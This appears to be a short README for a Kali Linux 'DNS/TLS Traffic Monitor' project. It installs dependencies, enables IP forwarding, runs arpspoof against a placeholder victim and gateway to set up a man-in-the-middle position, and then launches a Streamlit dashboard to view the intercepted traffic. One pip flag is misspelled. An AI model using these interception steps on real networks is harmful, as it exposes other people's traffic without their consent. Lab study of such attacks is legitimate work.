# Kali Linux Commands – DNS/TLS Traffic Monitor

## 0. System Preparation (Required for TLS/Scapy)

```bash
sudo apt update
sudo apt install build-essential libssl-dev python3-dev -y
pip install --upgrade cryptography
```

These packages ensure:

* TLS parsing works correctly in **Scapy**
* Python cryptography dependencies compile without errors

---

## 1. Enable IP Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## 2. Start ARP Spoofing (MITM)

### Terminal 1 – Spoof victim

```bash
sudo arpspoof -i <interface> -t <victim_ip> <gateway_ip>
```

### Terminal 2 – Spoof gateway

```bash
sudo arpspoof -i <interface> -t <gateway_ip> <victim_ip>
```

---

## 3. Install Python Dependencies

```bash
sudo apt install python3-pip
sudo pip3 install scapy streamlit pandas --break-system-package
```

---

## 4. Run Monitoring Dashboard

```bash
sudo streamlit run monitor.py
```

Open the **local Streamlit URL** shown in the terminal to view traffic.
